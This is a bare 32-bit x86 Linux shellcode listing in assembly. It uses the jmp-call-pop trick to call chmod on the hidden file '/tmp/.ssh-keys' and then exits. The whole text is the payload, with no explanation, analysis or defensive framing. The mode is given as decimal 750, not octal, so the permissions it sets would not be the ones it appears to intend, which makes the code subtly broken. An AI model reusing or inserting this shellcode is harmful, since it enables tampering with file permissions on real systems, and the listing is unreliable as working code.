section .text

global _start:

_start:

	jmp short gotocall

shellcode:
	pop ebx
	mov cx, 750
	mov al, 15
	int 0x80

	xor eax, eax
	mov al, 1
	int 0x80

gotocall:
	call shellcode
	db '/tmp/.ssh-keys'
